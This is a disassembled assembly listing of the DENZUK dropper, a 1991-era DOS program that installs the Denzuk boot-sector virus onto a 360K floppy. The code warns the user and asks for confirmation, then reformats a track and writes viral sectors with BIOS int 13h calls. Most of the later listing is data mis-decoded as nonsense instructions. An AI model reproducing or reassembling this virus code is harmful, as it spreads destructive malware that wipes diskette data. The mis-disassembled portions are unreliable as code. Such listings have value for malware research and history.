
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        DENZUK				         €€
;€€								         €€
;€€      Created:   4-Feb-91					         €€
;€€      Passes:    5	       Analysis Options on: J		         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_0001e	equ	24h
data_0002e	equ	26h
data_0003e	equ	4Ch
data_0004e	equ	4Eh
data_0005e	equ	78h
data_0006e	equ	1BCh
data_0007e	equ	1BEh
main_ram_size_	equ	413h
keybd_flags_1_	equ	417h
video_mode_	equ	449h
warm_boot_flag_	equ	472h
data_0008e	equ	4F6h
data_0009e	equ	51Ch			;*
data_0010e	equ	61Eh			;*
data_0011e	equ	7C00h			;*
data_0012e	equ	7C0Bh			;*
data_0013e	equ	7C0Eh			;*
data_0014e	equ	7C10h			;*
data_0015e	equ	7C11h			;*
data_0016e	equ	7C15h			;*
data_0017e	equ	7C16h			;*
data_0018e	equ	7C18h			;*
data_0019e	equ	7C1Ah			;*
data_0020e	equ	7C1Ch			;*
data_0021e	equ	7C2Ah			;*
data_0022e	equ	7C2Bh			;*
data_0023e	equ	7C37h			;*
data_0024e	equ	7C39h			;*
data_0025e	equ	7C3Bh			;*
data_0026e	equ	7C3Ch			;*
data_0027e	equ	7C3Dh			;*
data_0028e	equ	7C3Fh			;*
data_0029e	equ	7D77h			;*
data_0030e	equ	7DD6h			;*
data_0031e	equ	7DE1h			;*
data_0032e	equ	7DFDh			;*
data_0033e	equ	0
data_0035e	equ	28h
data_0036e	equ	33h
data_0037e	equ	5Ch
data_0157e	equ	1E50h			;*
data_0158e	equ	2000h			;*
data_0161e	equ	2A00h			;*
data_0164e	equ	7C00h			;*
data_0165e	equ	7C0Bh			;*
data_0166e	equ	7C15h			;*
data_0167e	equ	7C18h			;*
data_0168e	equ	7C1Ah			;*
data_0169e	equ	7C1Eh			;*
data_0171e	equ	7C2Ch			;*
data_0172e	equ	7C2Eh			;*
data_0173e	equ	7C30h			;*
data_0174e	equ	7C31h			;*
data_0175e	equ	7C32h			;*
data_0176e	equ	7CC6h			;*
data_0178e	equ	7E00h			;*
data_0179e	equ	8002h			;*
data_0181e	equ	0A82Ah			;*
data_0182e	equ	0AA00h			;*
data_0183e	equ	0AA02h			;*
data_0185e	equ	0AA2Ah			;*
data_0186e	equ	0AAAAh			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

denzuk		proc	far

start:
		mov	dx,29Dh
		dec	byte ptr ds:data_0037e
		jns	loc_0002		; Jump if not sign
		jmp	loc_0008
loc_0002:
		mov	dx,1BFh
		call	sub_0001
		xor	ah,ah			; Zero register
		int	16h			; Keyboard i/o  ah=function 00h
						;  get keybd char in al, ah=scan
		and	al,0DFh
		cmp	al,59h			; 'Y'
		jne	loc_ret_0009		; Jump if not equal
		mov	dl,ds:data_0037e
		xor	ah,ah			; Zero register
		int	13h			; Disk  dl=drive a  ah=func 00h
						;  reset disk, al=return status
		jc	loc_0007		; Jump if carry Set
		push	dx
		mov	dx,281h
		call	sub_0001
		pop	dx
		mov	ax,351Eh
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	al,9
		xchg	al,es:[bx+4]
		push	es
		push	bx
		push	ax
		push	ds
		pop	es
		xor	dh,dh			; Zero register
		mov	ch,28h			; '('
		mov	bx,offset data_0040
		mov	ax,509h
		int	13h			; Disk  dl=drive a  ah=func 05h
						;  format track=ch or cylindr=cx
						;   al=interleave, dh=head
		pop	ax
		pop	bx
		pop	es
		jc	loc_0007		; Jump if carry Set
		mov	es:[bx+4],al
		push	ds
		pop	es
		cld				; Clear direction
		mov	si,offset data_0058
		jmp	short loc_0004
loc_0003:
		test	dh,dh
		jnz	loc_0004		; Jump if not zero
		dec	cx
		jz	loc_ret_0009		; Jump if zero
loc_0004:
		lea	bx,[si+5]		; Load effective addr
		mov	bp,200h
		lodsb				; String [si] to al
		cmp	al,0F6h
		je	loc_0006		; Jump if equal
		mov	bx,offset data_0049
		cmp	al,[bx]
		je	loc_0005		; Jump if equal
		mov	di,bx
		mov	cx,bp
		rep	stosb			; Rep when cx >0 Store al to es:[di]
loc_0005:
		xor	bp,bp			; Zero register
loc_0006:
		lodsw				; String [si] to ax
		xchg	ax,cx
		lodsw				; String [si] to ax
		xchg	ax,dx
		or	dl,ds:data_0037e
		lea	si,[bp+si]		; Load effective addr
		mov	ax,301h
		push	si
		push	cx
		push	dx
		int	13h			; Disk  dl=drive a  ah=func 03h
						;  write sectors from mem es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		pop	dx
		pop	cx
		pop	si
		jnc	loc_0003		; Jump if carry=0
loc_0007:
		mov	dx,offset data_0048

denzuk		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0001	proc	near
loc_0008:
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx

loc_ret_0009:
		retn
sub_0001	endp

data_0040	db	28h
		db	 00h, 21h, 02h, 28h, 00h, 22h
		db	 02h, 28h, 00h, 23h, 02h, 28h
		db	 00h, 24h, 02h, 28h, 00h, 25h
		db	 02h, 28h, 00h, 26h, 02h, 28h
		db	 00h, 27h, 02h, 28h, 00h, 28h
		db	 02h, 28h, 00h, 29h, 02h
		db	0Dh
data_0041	db	0Ah, 'You are about to install a '
		db	'VIRUS on your diskette!!!', 0Dh, 0Ah
		db	'This will des'
data_0043	dw	7274h
data_0044	db	6Fh
data_0045	dw	2079h
		db	'ALL data on the diskette!!!', 0Dh
		db	0Ah, 'Inser'
data_0046	dw	2074h
		db	'a formatted 360K di'
data_0047	dw	6B73h
		db	'ette into the drive.', 0Dh, 0Ah, 'A'
		db	're you sure you want to proceed '
		db	'(y/N)? $'
		db	0Dh, 0Ah, 0Ah, 'Writing...$'
data_0048	db	0Dh
		db	 0Ah, 45h, 72h, 72h, 6Fh, 72h
		db	 07h, 21h, 07h, 21h, 07h
		db	'!$'
		db	'Usage:  DENZUK A:    ', 0Dh, 0Ah
		db	'$'
data_0049	dw	167 dup (0)
data_0050	dw	0
data_0051	db	0
data_0052	dw	0, 0
data_0054	dw	0, 0
		db	82 dup (0)
data_0056	dd	00000h
data_0057	dd	00000h
		db	77 dup (0)
data_0058	db	0F6h
		db	 29h, 28h, 00h, 00h,0FFh

locloop_0011:
		loop	locloop_0011		; Loop if cx > 0

		pop	di
		pop	si
		pop	es
		pop	ds
		pop	dx
		pop	cx
		pop	ax
		popf				; Pop flags
		retn
		db	 8Dh, 36h,0D1h, 07h
		db	0BFh, 90h, 0Bh,0B9h, 00h, 05h
		db	0F3h,0A4h
		db	 8Dh, 36h,0D1h, 0Ch
		db	0BFh, 40h, 2Bh,0B9h, 00h, 05h
		db	0F3h,0A4h,0C3h, 51h,0FCh, 32h
		db	0D2h,0BEh, 10h, 00h
loc_0012:
		mov	cx,28h

locloop_0013:
		mov	ax,es:[di]
		xchg	al,ah
		ror	ax,1			; Rotate
		ror	ax,1			; Rotate
		mov	dh,ah
		and	dh,0C0h
		and	ah,3Fh			; '?'
		or	ah,dl
		mov	dl,dh
		xchg	al,ah
		stosw				; Store ax to es:[di]
		loop	locloop_0013		; Loop if cx > 0

		dec	si
		jnz	loc_0012		; Jump if not zero
		pop	cx
		retn
		db	 51h,0FDh, 32h,0D2h
		db	0BEh, 10h, 00h
loc_0014:
		mov	cx,28h

locloop_0015:
		mov	ax,es:[di]
		xchg	al,ah
		rol	ax,1			; Rotate
		rol	ax,1			; Rotate
		mov	dh,al
		and	dh,3
		and	al,0FCh
		or	al,dl
		mov	dl,dh
		xchg	al,ah
		stosw				; Store ax to es:[di]
		loop	locloop_0015		; Loop if cx > 0

		dec	si
		jnz	loc_0014		; Jump if not zero
		pop	cx
		cld				; Clear direction
		retn
data_0066	db	'WS      EXE ', 0
		db	9 dup (0)
		db	 52h,0B1h, 3Bh, 12h, 02h, 00h
		db	 00h, 5Eh, 02h, 00h
		db	'WSHELP  OVR!'
		db	0
		db	9 dup (0)
		db	 03h, 88h, 12h, 11h, 41h, 01h
		db	0A0h, 9Dh, 00h, 00h
		db	'WSSPELL OVR!'
		db	0
		db	9 dup (0)
		db	 03h, 88h, 12h, 11h, 9Fh, 00h
		db	 80h, 80h, 00h, 00h, 59h,0F9h
		db	 43h,0F9h, 31h,0F9h, 45h,0F9h
		db	 52h,0F9h, 50h, 29h, 00h
		db	9 dup (0)
		db	0A0h,0B2h, 46h, 12h, 00h, 00h
		db	 00h, 00h, 00h, 00h
		db	'WSMSGS  OVR!'
		db	0
		db	9 dup (0)
		db	 03h, 88h, 12h, 11h,0C0h, 00h
		db	 62h, 53h, 00h, 00h
		db	'PREVIEW OVR!'
		db	0
		db	9 dup (0)
		db	 03h, 88h, 0Fh, 11h, 16h, 01h
		db	 10h,0ABh, 00h, 00h
		db	'PREVIEW MSG!'
		db	0
		db	9 dup (0)
		db	 03h, 88h, 0Fh, 11h,0D5h, 00h
		db	 00h, 22h, 00h, 00h
		db	'DRAFT   PDF!'
		db	0
		db	9 dup (0)
		db	 03h, 88h, 12h, 11h,0DEh, 00h
		db	0AAh, 03h, 00h, 00h
		db	'WSSHORT OVR!'
		db	0
		db	9 dup (0)
		db	 03h, 88h, 12h, 11h,0DFh, 00h
		db	 00h, 02h, 00h, 00h
		db	'WS4     PDF!'
		db	0
		db	9 dup (0)
		db	 03h, 88h, 12h, 11h,0E0h, 00h
		db	0ABh, 01h, 00h, 00h
		db	'CONFIG  SYS!'
		db	0
		db	9 dup (0)
		db	 11h,0A3h, 39h, 12h,0E1h, 00h

locloop_0017:
		or	ax,[bx+si]
		add	[bx+si],al
		inc	cx
		push	bp
		push	sp
		dec	di
		inc	bp
		pop	ax
		inc	bp
		inc	bx
		inc	dx
		inc	cx
		push	sp
		and	[bx+si],ax
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],ah
		mov	word ptr ds:[1239h],ax
		loop	locloop_0018		; Loop if cx > 0


locloop_0018:
		or	[bx+si],ax
		add	[bx+si],al
		push	di
		push	bx
		dec	ax
		pop	cx
		push	ax
		dec	ax
		and	[bx+si],ah
		dec	di
		imul	byte ptr [bx+si]	; ax = data * al
		sub	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bp+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0183e
		test	al,0
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		or	ch,[bp+si+0A0h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	ch,[bp+si-5556h]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0182e
		stosb				; Store al to es:[di]
		add	[bx+si],al
		or	ch,[bp+si+0A8h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		add	[bp+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bp+si-7F56h],ch
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		test	al,0
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si+80h]
		add	[bx+si],al
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,byte ptr ds:[0A00h]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		test	al,0
		add	ch,[bp+si+0A0h]
		add	ch,[bp+si+0A8h]
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		or	ch,[bp+si-5556h]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+80h],ch
		add	[bx+si],al
		add	[bp+si-5556h],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],2
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],al
		add	byte ptr [bx+si],0
		add	[bp+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		add	ch,[bp+si+2A00h]
		mov	al,ds:data_0033e
		add	ch,[bp+si+0A0h]
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	ch,[bp+si-5556h]
		mov	al,ds:data_0033e
		add	[bx+si],al
		add	[bx+si],al
		pushf				; Push flags
		push	ax
		push	cx
		push	dx
		push	ds
		push	es
		push	si
		push	di
		push	cs
		pop	ds
		mov	ax,5
		int	10h			; Video display   ah=functn 00h
						;  set display mode in al
		mov	ax,0B800h
		mov	es,ax
;*		call	sub_0002		;*
		db	0E8h, 24h, 00h
		mov	cx,10h

locloop_0019:
		call	sub_0003
		mov	di,3040h
;*		call	sub_0004		;*
		db	0E8h, 57h, 00h
		loop	locloop_0019		; Loop if cx > 0

		mov	cx,0FFFFh

locloop_0020:
		loop	locloop_0020		; Loop if cx > 0

		mov	cx,0F6FFh
		daa				; Decimal adjust
		sub	[bx+si],al
		add	[bp+si],al
		stosb				; Store al to es:[di]
		test	al,0
		add	[bp+si-5556h],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0003	proc	near
		add	[bp+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		or	ch,[bp+si+0A0h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		or	ch,[bp+si-5F56h]
		add	[bx+si],al
		or	ch,[bp+si+80h]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	ch,[bp+si+0AAh]
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		sub	al,[bx+si]
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0Ah
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0179e
		add	[bx+si],al
		add	[bp+si-5756h],ch
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0158e
		add	[bp+si-5556h],ch
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si-7F56h],ch
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0181e
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		add	[bp+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		test	al,0Ah
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		or	ch,[bp+si+0A8h]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0186e
		add	[bx+si],al
		add	[bp+si-5556h],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		add	[bx+si],al
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		test	al,0
		or	ch,[bp+si-5556h]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		sub	ch,[bp+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0185e
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		mul	byte ptr ds:data_0035e	; ax = data * al
		add	[bx+si],al
		add	[bx+si],al
		sub	ch,[bp+si-5556h]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,byte ptr data_0041+40h	; (' ')
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		mov	al,byte ptr data_0041+40h	; (' ')
		stosb				; Store al to es:[di]
		mov	al,byte ptr data_0041+40h	; (' ')
		stosb				; Store al to es:[di]
		test	al,0
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		test	al,0
		add	[bx+si],al
		or	ch,[bp+si-5556h]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],ch
		add	byte ptr [bx+si],0
		add	[bx+si],al
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		sub	ch,[bp+si+2A00h]
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	ch,[bp+si+0A0h]
		add	[bp+si],ch
		stosb				; Store al to es:[di]
		add	byte ptr [bx+si],0
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si+0A8h],ch
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		add	[bx+si],al
		or	ch,[bp+si-5556h]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0161e
		stosb				; Store al to es:[di]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	byte ptr [bx+si],0
		add	[bp+si],cl
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		add	[bp+si],ch
		add	[bp+si],ch
		add	[bx+si],al
		add	[bp+si],al
		stosb				; Store al to es:[di]
		mov	al,ds:data_0033e
		or	ch,[bp+si+0A0h]
		add	[bx+si],al
		or	ch,[bx+si+0]
		nop				;*ASM fixup - displacement
		nop				;*ASM fixup - sign extn byte
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
